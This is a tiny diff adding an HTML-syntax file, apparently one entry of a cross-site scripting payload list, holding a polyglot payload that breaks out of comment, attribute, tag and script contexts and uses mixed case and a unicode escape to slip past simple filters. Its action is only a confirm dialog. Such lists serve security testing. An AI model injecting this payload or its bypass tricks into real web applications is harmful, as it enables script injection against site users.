@@ -1,0 +1,5 @@
+---
+syntax: html
+---
+<!-- Break out of comment, attribute, tag, and script block; simple filter bypasses -->
+-->'"/></sCript><svG x=">" oNload=(co\u006efirm)``>
